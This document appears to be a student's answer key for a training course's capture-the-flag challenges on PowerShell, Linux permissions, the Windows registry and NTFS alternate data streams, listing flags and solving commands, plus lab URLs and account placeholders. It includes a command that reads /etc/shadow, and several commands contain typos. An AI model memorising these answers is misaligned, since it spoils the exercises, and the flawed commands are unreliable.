        https://os.cybbh.io/public
______________________________________________________________________________________________________________________________________________________________________________________
        https://cctc.cybbh.io/students
______________________________________________________________________________________________________________________________________________________________________________________
        http://10.50.22.129:8000/
______________________________________________________________________________________________________________________________________________________________________________________
## MARO-M-007
## M24007 password
## Stack 1: student@10.50.25.34 password
# |
# |
# |
# |
# |
# 01_Windows_PowerShell
## Primer_CLI_1-9 *
1: Which program starts with every CMD and PowerShell instance in Windows 7 and later? - ``` ConHost.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What Windows 10 feature supports installing Linux subsystem? - ``` WSL ```
______________________________________________________________________________________________________________________________________________________________________________________
3: Which Windows feature can be used to interact with any CLI on the Windows system concurrently using multiple tabs? - ``` Windows Terminal ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What was the default shell (command line) of Windows versions Windows 2000 through Windows 8.1? - ``` CMD ```
______________________________________________________________________________________________________________________________________________________________________________________
5: What data type do all cmd.exe commands return? - ``` String ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What framework is PowerShell built on? - ``` .net ```
______________________________________________________________________________________________________________________________________________________________________________________
7: "What will all of the below give you? - ``` powershell version ```

(get-host).version

$host.version

$psversiontable.psversion"
______________________________________________________________________________________________________________________________________________________________________________________
8: After PowerShell Core is installed what CLI command launches it? - ``` pwsh.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
9: "After PowerShell Core is installed you can still run the built in version of PowerShell side-by-side. What CLI command will launch the built in version?" - ``` PowerShell.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Basics_1-6 *
1: What syntax do PowerShell cmdlets follow? - ``` Verb-Noun ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What PS command will list all PowerShell cmdlets? - ``` Get-Command ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What PowerShell command will list all verbs? - ``` Get-Verb ```
______________________________________________________________________________________________________________________________________________________________________________________
4: BASH commands output strings. PowerShell commands output what data type? - ``` Objects ```
______________________________________________________________________________________________________________________________________________________________________________________
5: All PowerShell objects are comprised of what two things? - ``` properties, methods ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What command will list all things that make up a PowerShell object? - ``` Get-Member ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Powershell_Alias_1-2 *
1: What PowerShell command will list PowerShell aliases? - ``` Get-Alias ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What PowerShell command lists all of the contents of a directory? - ``` Get-Childitem ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Help_1-4 *
1: What is the basic cmdlet that displays help about Windows Powershell cmdlets and concepts? - ``` Get-Help ```
______________________________________________________________________________________________________________________________________________________________________________________
2: PowerShell "help files" don't show the entire help file with a basic command. What switch option shows the entire help file? - ``` -Full ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What PowerShell command will update the PowerShell "help files" to the latest version? - ``` Update-Help ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What help switch will show you the "help files" on Microsoft's website, in your default browser? - ``` -Online ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Interaction_1-3 *
1: What command will start the Chrome browser on your machine? - ``` Start-Process "Chrome.exe" ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What command using a PS Method will stop chrome? - ``` (Get-Process chrome*).kill() ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What PowerShell command (without using a method) will stop the Chrome process? - ``` Stop-Process -Name "chrome" ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_CIMClasses_1 *
1: PowerShell doesn't have a native cmdlet that will give you processor information (such as get-processor or get-cpu). Knowing this information might be necessary. What command would give you information about the system's processor? - ``` Get-CimInstance -ClassName Win32_Processor ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Logic_1-2 *
1: What PowerShell command will read a text file? - ``` Get-Content ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What PowerShell command will allow for counting lines in a file, averaging numbers, and summing numbers? - ``` Measure-Object ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Regex_1 *
1: What PowerShell command searches for text patterns in a string? - ``` Select-String ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Powershell_Basics_7-8 *
7: Users' files are stored in their corresponding home directory. What is the literal path to all home directories on a Windows 10 system? - ``` C:\Users ```
______________________________________________________________________________________________________________________________________________________________________________________
8: How many properties are available for the get-process cmdlet? - ``` 52 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Alias_3 *
3: How many aliases does PowerShell have for listing the contents of a directory? - ``` 3 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Help_5 *
5: When requesting the help file for the get-process cmdlet, what full command is the 9th example given? - ``` Get-Process Powershell ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_CIMClasses_2 *
2: To complete this challenge, find the description of the Lego Land service. - ``` i_love_legos ```

        Get-WMIObject WIN32_service | ?{$_.Name -like "legoland"} | select Description
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Logic_3-7 *
3: In the CTF folder on the CTF User's Desktop, count the number of words in words2.txt. - ``` 5254 ```

        Get-Content words2.txt | Measure-Object -Word
______________________________________________________________________________________________________________________________________________________________________________________
4: Count the number of files in the Videos folder in the CTF user's home directory. - ``` 925 ```

        (Get-ChildItem | Measure-Object).count
______________________________________________________________________________________________________________________________________________________________________________________
5: Find the only line that makes the two files in the CTF user's Downloads folder different. - ``` popeye ```

        Compare-Object -referanceobject (Get-Object old.txt) -differenceobject (get-content new.txt)
______________________________________________________________________________________________________________________________________________________________________________________
6: The password is the 21st line from the top, in ASCII alphabetically-sorted, descending order of the words.txt file. - ``` ZzZp ```

        Get-Content words.txt | Sort-Object -descending | Selct-Object -index 21
______________________________________________________________________________________________________________________________________________________________________________________
7: Count the number of unique words in words.txt - ``` 456976 ```

        (Get-Content words.txt | Sort-Object | Get-Unique).count
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Basics_9 *
9: How many methods are available for the get-process cmdlet? - ``` 19 ```

        (Get-Process | Get-Member -membertype method).count
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Logic_8 *
8: Count the number of folders in the Music folder in the CTF user’s profile. - ``` 411 ```

        (Get-ChildItem -recurse | Where-Object {$_.PSIsContainer}).count
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Regex_2-4 *
2: Count the number of times, case-insensitive, gaab is listed in words.txt - ``` 1 ```

        (Get-Content words.txt | select-string -allmatches "gaab").count
______________________________________________________________________________________________________________________________________________________________________________________
3: Count the number of words, case-insensitive, with either a or z in a word, in the words.txt file - ``` 160352 ```

        (Get-Content words.txt | Where-Object {$_ -match '(a|z)'}).count
______________________________________________________________________________________________________________________________________________________________________________________
4: Count the number of lines, case-insensitive, that az appears in the words.txt file - ``` 2754 ```

        (Get-Content words.txt | Where-Object {$_ -match '(az)'}).count
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Logic_9 *
9: Use a PowerShell loop to unzip the Omega file 1,000 times and read what is inside. - ``` kung-fu ```

        mkdir Extracted
        $zipPath = 'C:\Users\CTF\Omega1000.zip'; 1000..1 | ForEach-Object { Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, 'C:\Users\CTF\Extracted'); $zipPath = "C:\Users\CTF\Extracted\Omega$($_ - 1).zip" }
        cd Extracted
        Expand-Archive Omega1.zip
        cd Omega1
        Expand-Archive Omega1.zip
        cd Omega1
        type Omega1.txt
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_PowerShell_Regex_5 *
5: Count the number of words in words.txt that meet the following criteria: - ``` 357 ```

a appears at least twice consecutively

and is followed immediately by any of the letters a through g

Note: File Location - C:\Users\CTF\Desktop\CTF

Example: aac...aaa...

        (Get-Content words.txt | Where-Object {$_ -match '((aa)[a-g])'}).count
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 02_Windows_PowerShell_Profiles
## Windows_PowerShell_Profiles_1-8 *
1: Which PowerShell profile has the lowest precedence? - ``` Current User, Current Host ```
______________________________________________________________________________________________________________________________________________________________________________________
2: Which PowerShell profile has the highest precedence? - ``` All Users, All Hosts ```
______________________________________________________________________________________________________________________________________________________________________________________
3: Which PowerShell variable stores the current user’s home directory? - ``` $Home ```
______________________________________________________________________________________________________________________________________________________________________________________
4: Which PowerShell variable stores the installation directory for PowerShell? - ``` $PsHome ```
______________________________________________________________________________________________________________________________________________________________________________________
5: Which PowerShell variable stores the path to the "Current User, Current Host" profile? - ``` $Profile ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What command would you run to view the help for PowerShell Profiles? - ``` Get-Help about_profiles ```
______________________________________________________________________________________________________________________________________________________________________________________
7: What command would tell you if there was a profile loaded for All Users All Hosts? - ``` Test-Path -Path $PROFILE.AllUsersAllHosts ```
______________________________________________________________________________________________________________________________________________________________________________________
8: Malware is running on the primary PowerShell profile on the File-Server. Based on PowerShell profile order of precedence (what is read first), find the correct flag. - ``` I am definitely not the malware ```
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 04_Linux_Basics2
## Linux_Basics_Reformat *
This challenge is worth 0 POINTS, and should only be attempted after all other challenges that are open to you, are completed! - ``` ??? ```

File: /home/garviel/NMAP_all_hosts.txt

Format the file into the output displayed below using native Linux binaries like awk

Present the script used to the instructor for credit when complete. Be prepared to explain the code.

HINT: awk is a powerful text manipulation scripting language. It is a bit challenging to learn. Use the tutorials below to get started.

Awk - A Tutorial and Introduction - by Bruce Barnett

The GNU Awk User’s Guide
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_1-4 *
1: What command lists the contents of directories in Linux/Unix systems? - ``` ls ```
______________________________________________________________________________________________________________________________________________________________________________________
2: For the ls command, what arguments, or switch options, will allow you to print human-readable file sizes in a long-list format? - ``` ls -hl ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What character will pipe the standard output from echo "I’m a plumber" to another command, as standard input? - ``` | ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What argument/switch option, when used with man, will search the short descriptions and man-page-names for a keyword that you provide? - ``` man -k ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_LFS_Hierarchy_1-6 *
1: What is the absolute path to the root directory? - ``` / ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What is the absolute path to the default location for configuration files? - ``` /etc ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What is the directory that contains executable programs (binaries) which are needed in single user mode, to bring the system up or to repair it? - ``` /bin ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What is the absolute path to the directory which contains non-essential binaries that are accessible by standard users as well as root? - ``` /usr/bin ```
______________________________________________________________________________________________________________________________________________________________________________________
5: An absolute path to a directory which contains binaries only accessible by the root user, or users in the root group. - ``` /sbin ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What is the absolute path for the binary cat man-page? - ``` /usr/share/man/man1/cat.1.gz ```

        $ man --path cat
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_5-6 *
5: Search the man pages for the keyword digest. Then, use one of the binaries listed to hash the string OneWayBestWay using the largest sha hash available. - ``` a81bc463469ee1717fc9e388e3799c653f63a3de5e9496b5707b56488b046cbf75665235d316c5c0053a597dc7d40c917a2d9006fe35e9cb47766c05ac71989b ```

        $ man -k digest
        $ echo "OneWayBestWay" | sha512sum
______________________________________________________________________________________________________________________________________________________________________________________
6: Use File: /home/garviel/Encrypted this file contains encrypted contents. Identify its file type, then decode its contents. - ``` DeCrypt ```

        $ file Encrypted
        $ unzip Encrypted
        $ file cipher
        $ file symmetric
        $ cat cipher
        $ cat symmetric
            #gives you the key & the Hashing Algoritm
        $ openssl AES128 -d -in cipher
            #use the key that was enumerated from the symmetric file
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_LFS_Hierarchy_7 *
7: Search the user home directories to find the file with the second-most lines in it. The flag is the number of lines in the file. - ``` 20000 ```

        $ sudo find /home/* -type f ! -name "*.vdi" -exec wc -l {} +
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_Users_And_Groups_1-4 *
1: Read the file that contains the user database for the machine. Identify a strange comment. - ``` Traitor ```

        $ cat /etc/passwd | cut -d: -f5-6 | sort
______________________________________________________________________________________________________________________________________________________________________________________
2: Identify all members of the lodge group. List their names in alphabetical order with a comma in between each name. - ``` aximand,erebus,ezekyle,garviel,sejanus,tarik ```

        $ cat /etc/group | grep "lodge"
______________________________________________________________________________________________________________________________________________________________________________________
3: Find the user with a unique login shell. - ``` nobody ```

        $ cat /etc/passwd | cut -d: -f7 | sort | uniq
        $ cat /etc/passwd | grep "/bin/sh"
______________________________________________________________________________________________________________________________________________________________________________________
4: Identify the algorithm, the amount of salted characters added, and the length of the hashed password in the file that stores passwords. - ``` SHA512,8,86 ```

        $ sudo cat /etc/shadow | grep -v ! $2
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_Permissions_1-10 *
1: Find the directory named Bibliotheca. Enter the absolute path to the directory. - ``` /media/Bibliotheca ```

        $ find / -type d -name "Bibliotheca" 2>/dev/null
______________________________________________________________________________________________________________________________________________________________________________________
2: Identify the number of users with valid login shells, who can list the contents of the Bibliotheca directory. - ``` 15 ```

        $ cd /media
        $ ls -l
        $ cat /etc/passwd | grep "sh"
        $ cat /etc/passwd | grep "bash"
______________________________________________________________________________________________________________________________________________________________________________________
3: The permissions that user sejanus has on /media/Bibliotheca, in octal format. - ``` 5 ```
______________________________________________________________________________________________________________________________________________________________________________________
4: Locate the file within /media/Bibliotheca that is modifiable by the only user that is part of the chapter group, but not part of the lodge group. - ``` Codex_Astartes ```

        $ cat /etc/group | grep "chapter"
______________________________________________________________________________________________________________________________________________________________________________________
5: Identify the file within /media/Bibliotheca where the owning group has more rights than the owning user. - ``` Codex_Imperium ```
______________________________________________________________________________________________________________________________________________________________________________________
6: Execute the file owned by the guardsmen group in /media/Bibliotheca, as the owning user. - ``` GHOSTS ```
______________________________________________________________________________________________________________________________________________________________________________________
7: The user tyborc is unable to access the directory: /media/Bibliotheca/Bibliotheca_unus Why? Identify the permission missing in standard verb form. - ``` execute ```
______________________________________________________________________________________________________________________________________________________________________________________
8: Locate the file in /media/Bibliotheca that Quixos has sole modification rights on. - ``` /media/Bibliotheca/Bibliotheca_duo/Codex_Hereticus ```

        $ cd /media/Bibliotheca
        $ find . -type f -user quixos -perm 600
______________________________________________________________________________________________________________________________________________________________________________________
9: Read a concealed file within /media/Bibliotheca - ``` Expand your mind ```

        $ cd /media/Bibliotheca/Bibliotheca_duo
        $ ls -la
        $ cat .Secrets_of_the_Immaterium
______________________________________________________________________________________________________________________________________________________________________________________
10: Find the warp and read its secrets for the flag. - ``` Ph'nglui mglw'nafh Cthulhu ```

        $ cd /media/Bibliotheca/Bibliotheca_duo/.warp2/.warp5/warp5/.warp3/warp2/
        $ cat .secrets
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_Regular_Expressions_1-4 *
1: Using the commands ls and grep, identify the number of directories in /etc/ that end in .d - ``` 28 ```

        $ ls -l /etc | grep '^d.*\.d$'
______________________________________________________________________________________________________________________________________________________________________________________
2: Use regular expressions to match patterns similar to valid and invalid IP addresses. - ``` 78 ```

        $ cd /home/garviel/numbers 
        $ grep -E '^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$' numbers | wc -l
______________________________________________________________________________________________________________________________________________________________________________________
3: Use regular expressions to match valid IP addresses. The flag is the number of addresses. - ``` 18 ```

        $ cat numbers | grep -oP '\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b' | wc -l
______________________________________________________________________________________________________________________________________________________________________________________
4: Use regular expressions to match patterns that look similar to a MAC Address. Flag is a count of the number of matches. - ``` 4877 ```

        $ cd /home/garviel/numbers
        $ grep -E '^([0-9a-zA-Z]{2}[-:]){5}([0-9a-zA-Z]{2})$' numbers | wc -l
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_Reformat_1-2 *
1: Use awk to print lines: >= 420 AND <=1337 - ``` e62ff70d772ef0977f4f8fe1751fda5689ce1daf1fabc6d0cc49da234d02719986c0acb97f582166170a5a1f418e854602a5eb98c773655906a3f85440c37d39 ```

        $ awk 'NR >= 420 && NR <= 1337 {print}' numbers | sha512sum
______________________________________________________________________________________________________________________________________________________________________________________
2: Use awk to create a separate CSV (comma separated value) file that contains columns 1-6. - ``` 6cebf155e9c8f49d76ae1268214ff0b5 ```

        $ awk '{print $1","$2","$3","$4","$5","$6}' connections > conn.csv

After you do this you have to edit the first line to look like the example "#separator \x09,,,,,". After that you can get the md5sum

        md5sum conn.csv
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_Bash_Logic_1-2 *
1: The garviel user has a minefield map and controls to a Titan War Machine located in their home directory. Interpret the Titan Controls to navigate the minefield and annihilate the target. - ``` AAAAA3AAA3AAAABAABAAAA ```

        cd /home/garviel/Battlefield
        cat titan_commands
        B = Left
        A = Forward
        3 = Right
        cat minefield_map
______________________________________________________________________________________________________________________________________________________________________________________
2: The flag resides in $HOME/paths... you just need to determine which flag it is. The flag sits next to a string matching the name of a $PATH/binary on your system. - ``` ??? ```

After comparing you can find python3 in expressions. 

        echo $PATH | sed 's/:/\n/g' > paths.txt
        xargs ls -1 < paths.txt > binaries.txt
        cat paths | cut -d" " -f1 > words.txt
        grep -w -f words.txt binaries.txt
        
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_Regular_Expressions_5 *
5: Use regular expressions to find valid Locally Administered or Universally Administered Unicast MAC addresses. Give the count of Locally and Universally Administered MAC addresses as the answer. - ``` 178 ```

What matters isn't the Locally or Universally Administered MAC, but the unicast part of it. For that, the second hex digit has to be even (0,2,4,6,8,A,C,E).

        grep -E '^([0-9a-fA-F][02468aAcCeE][-:])([0-9a-fA-F]{2}[-:]){4}([0-9a-fA-F]{2})$' numbers | wc -l
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Basics_Bash_Logic_3 *
3: Identify heresy by comparing the Inquisition_Targets file to members of the Guardsmen group. - ``` 8 ```

        cd /home/garviel
        cat /etc/group | grep guardsmen | cut -d: -f4 | sed 's/,/\n/g' > guardsmen.txt
        grep -f guardsmen.txt Inquisition_Targets
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 05_Windows_Registry
## Primer_Registry_1-10 *
1: What Windows registry path is the Volatile Hive? - ``` HKLM\HARDWARE ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What registry key creates the Wow6432Node to represent 32-bit applications that run on a 64-bit version of Windows? - ``` HKEY_LOCAL_MACHINE\SOFTWARE ```
______________________________________________________________________________________________________________________________________________________________________________________
3: In what registry path are the BOOT_START drivers located? - ``` HKLM\SYSTEM\CurrentControlSet\Services ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What start value do BOOT_START drivers have in the registry? - ``` 0x0 ```
______________________________________________________________________________________________________________________________________________________________________________________
5: During kernel initialization, what registry location is read containing all SYSTEM_START drivers? - ``` HKLM\SYSTEM\CurrentControlSet\Services ```
______________________________________________________________________________________________________________________________________________________________________________________
6: SERVICE_AUTO_START drivers and services are loaded after kernel initialization. What start value do they have in the registry? - ``` 0x02 ```
______________________________________________________________________________________________________________________________________________________________________________________
7: What start value do SERVICE_DEMAND_START drivers and services have in the registry? - ``` 0x3 ```
______________________________________________________________________________________________________________________________________________________________________________________
8: When accessing a remote registry which are the only 2 accessible HKEYs? - ``` HKLM, HKU ```
______________________________________________________________________________________________________________________________________________________________________________________
9: What PowerShell cmdlet will list currently mapped drives? - ``` Get-PSDrive ```
______________________________________________________________________________________________________________________________________________________________________________________
10: What is the native Windows GUI tool for managing the registry? - ``` Registry Editor ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Registry_Basics_1-17 *
1: What registry hive contains all machine settings? - ``` HKLM ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What registry hive contains all user settings? - ``` HKU ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What registry hive contains only the currently logged-in user's settings? - ``` HKCU ```
______________________________________________________________________________________________________________________________________________________________________________________
4: The HKEY_CURRENT_USER registry hive is a symbolic link to another registry subkey. What is the subkey that it is linked to? - ``` HKU\S-1-5-21-2881336348-3190591231-4063445930-1004 ```
______________________________________________________________________________________________________________________________________________________________________________________
5: What PowerShell command will list all the subkeys and contents in the current directory and/or will list all the subkeys and the contents of a directory you specify? - ``` Get-Childitem ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What PowerShell command will list only the contents of a registry key or subkey? - ``` Get-Item ```
______________________________________________________________________________________________________________________________________________________________________________________
7: What registry subkey runs every time the machine reboots? - ``` HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN ```
______________________________________________________________________________________________________________________________________________________________________________________
8: What registry subkey runs every time a user logs on? - ``` HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN ```
______________________________________________________________________________________________________________________________________________________________________________________
9: What registry subkey runs a single time, then deletes its value once the machine reboots? - ``` HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE ```
______________________________________________________________________________________________________________________________________________________________________________________
10: What registry subkey runs a single time, then deletes its value when a user logs on? - ``` HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE ```
______________________________________________________________________________________________________________________________________________________________________________________
11: What is the suspicious value inside of the registry subkey from your previous challenge named registry_basics_7?(#17:) - ``` C:\malware.exe ```

        reg query HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
______________________________________________________________________________________________________________________________________________________________________________________
12: What is the suspicious value inside of the registry subkey that loads every time the "Student" user logs on? - ``` C:\botnet.exe ```

        reg query HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
______________________________________________________________________________________________________________________________________________________________________________________
13: What is the value inside of the registry subkey from registry_basics_9?(#19:) - ``` C:\virus.exe ```

        reg query HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE
______________________________________________________________________________________________________________________________________________________________________________________
14: What is the value inside of the registry subkey that loads a single time when the "student" user logs on? - ``` C:\worm.exe ```

        reg query HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE
______________________________________________________________________________________________________________________________________________________________________________________
15: Figure out the manufacturer's name of the only USB drive that was plugged into this machine. - ``` SanDisk9834 ```

        reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR
______________________________________________________________________________________________________________________________________________________________________________________
16: What suspicious user profile, found in the registry, has connected to this machine? - ``` Hacker_McHackerson ```

        Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | Select-Object -Property PSChildName, ProfileImagePath
______________________________________________________________________________________________________________________________________________________________________________________
17: What suspicious wireless network, found in the registry, has this system connected to? - ``` Terror_cafe_network ```

        reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\NETWORKLIST\PROFILES\{20A9DB9D-5643-46F7-9FC7-0C382A286301}"
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 06_Windows_Alternate_Data_Stream
## Primer_NTFS_1-17 *
1: The ____ determines how the data is stored on disk. - ``` File System ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What are NTFS partition sectors grouped into? - ``` Clusters ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What contains the metadata about all of the files and directories on a NTFS partition? - ``` Master File Table ```
______________________________________________________________________________________________________________________________________________________________________________________
4: NTFS files are collections of what? - ``` Attributes ```
______________________________________________________________________________________________________________________________________________________________________________________
5: Which NTFS attribute would store an alternate data stream? - ``` $DATA ```
______________________________________________________________________________________________________________________________________________________________________________________
6: Which NTFS attribute holds information about a file's encrypted attributes? - ``` $LOGGED_UTILITY_STREAM ```
______________________________________________________________________________________________________________________________________________________________________________________
7: Which NTFS attribute that is composed of the file security and access control properties? - ``` $SECURITY_DESCRIPTOR ```
______________________________________________________________________________________________________________________________________________________________________________________
8: In NTFS, what is the type id, in hex, of the attribute that actually stores a NTFS files contents? - ``` 0x80 ```
______________________________________________________________________________________________________________________________________________________________________________________
9: In NTFS what is the maximum number of bytes a MFT entry (containing the entirety of a file) can contain to be considered "Resident Data"? - ``` 1024 ```
______________________________________________________________________________________________________________________________________________________________________________________
10: NTFS permissions can be a assigned to a filesystem object in two ways. Which way is intentionally assigned on the file or folder? - ``` Explicit ```
______________________________________________________________________________________________________________________________________________________________________________________
11: NTFS permissions can be a assigned to a filesystem object in two ways. Which way is the results of an object being assigned permissions as the result of being the child of another object? - ``` Inherited ```
______________________________________________________________________________________________________________________________________________________________________________________
12: Which NTFS file level permission is missing from the following list? Write, Read & Execute, Modify, Full Control - ``` Read ```
______________________________________________________________________________________________________________________________________________________________________________________
13: Which NTFS folder level permission is missing from the following list?: Read, Write, Read & Execute, Modify, Full control - ``` List Folder Contents ```
______________________________________________________________________________________________________________________________________________________________________________________
14: Which NTFS file level permission permits changing the contents of a file, deleting the file but does not allow the ability to change the permissions on the file? - ``` Modify ```
______________________________________________________________________________________________________________________________________________________________________________________
15: Which NTFS folder level permission allows changing permissions? - ``` Full Control ```
______________________________________________________________________________________________________________________________________________________________________________________
16: Which NTFS attribute stores the file times of an object? - ``` $STANDARD_INFORMATION ```
______________________________________________________________________________________________________________________________________________________________________________________
17: What CLI command will only show the letters of attached drives? - ``` fsutil fsinfo drives ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_File_System_Basics_1-14 *
1: Every file on a Windows system has attributes. What does the d attribute mean? - ``` Directory ```
______________________________________________________________________________________________________________________________________________________________________________________
2: Every file on a Windows system has attributes. What does the h attribute mean? - ``` Hidden ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What PowerShell command will list all files in the current directory, regardless of their attributes? - ``` Get-Childitem -Force ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What PowerShell command will give you the sha512 hash of a file? - ``` Get-FileHash -Algorithm sha512 ```
______________________________________________________________________________________________________________________________________________________________________________________
5: What PowerShell command will list permissions of a file? - ``` Get-Acl ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What Windows file maps hostnames to IP addresses? - ``` Hosts ```
______________________________________________________________________________________________________________________________________________________________________________________
7: Which group has Read and Execute (RX) permissions to the file listed in the previous challenge?(#23) - ``` BUILTIN\Users ```
______________________________________________________________________________________________________________________________________________________________________________________
8: Find the last five characters of the MD5 hash of the hosts file. - ``` 7566D ```

        $hostsFilePath = "C:\Windows\System32\drivers\etc\hosts"
        $md5Hash = Get-FileHash -Path $hostsFilePath -Algorithm MD5
        $lastFiveChars = if ($md5Hash.Hash.Length -ge 5) { $md5Hash.Hash.Substring($md5Hash.Hash.Length - 5) } else { "Hash too short" }
        $lastFiveChars
______________________________________________________________________________________________________________________________________________________________________________________
9: Examine the readme file somewhere in the CTF user’s home directory. - ``` 123456 ```

        cd c:\Users\CTF
        Get-ChildItem -path readme* -Recurse -Force
        cd .\Favorites\
        Get-Content .\README
______________________________________________________________________________________________________________________________________________________________________________________
10: There is a hidden directory in the CTF user's home directory. The directory contains a file. Read the file. - ``` ketchup ```

        Get-ChildItem -path c:\users\ctf -hidden -Recurse -Force -directory
        cd secretsauce
        Get-Content saucey  
______________________________________________________________________________________________________________________________________________________________________________________
11: Find a file in a directory on the desktop with spaces in it. FLAG is the contents of the file - ``` 987654321 ```

        Get-ChildItem -Path . -Recurse | Where-Object { $_.Name -like '* *' }
        cd C:\Users\CTF\Desktop
        cd '.\z                          -                                                                          a\'
        Get-Content .\spaces.txt
______________________________________________________________________________________________________________________________________________________________________________________
12: Find the Alternate Data Stream in the CTF user's home, and read it. - ``` P455W0RD ```

        Get-ChildItem -Path "C:\Users\CTF\" -Recurse -File
        cmd /c dir /R | findstr /C:":"
        Get-Content .\nothing_here -Stream hidden
______________________________________________________________________________________________________________________________________________________________________________________
13: "Fortune cookies" have been left around the system so that you won't find the hidden password... - ``` fortune_cookie ```

        Get-ChildItem -Path "C:\*fortune*" -Recurse
        cmd /c dir /R | findstr /C:":"
        Get-Content '.\The Fortune Cookie' -Stream none
______________________________________________________________________________________________________________________________________________________________________________________
14: There are plenty of phish in the C:\Users\CTF, but sometimes they're hidden in plain site. - ``` phi5hy ```

Goto C:\Users\CTF look for anything phishy related to site(WWW).

        Get-ChildItem -Force
        Get-Content -Force .\200
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 07_Windows_Boot_Process
## Primer_Boot_Process_1-29 *
1: What is the smallest addressable unit on a hard disk? - ``` Sector ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What term describes a logical division of a single storage device? - ``` Partition ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What term describes a formatted storage device that can span 1 or more partitions, has a single file system and is assigned a drive letter? - ``` Volume ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What CLI disk partitioning tool is available in Windows to view and manipulate both partitions and volumes? - ``` Diskpart ```
______________________________________________________________________________________________________________________________________________________________________________________
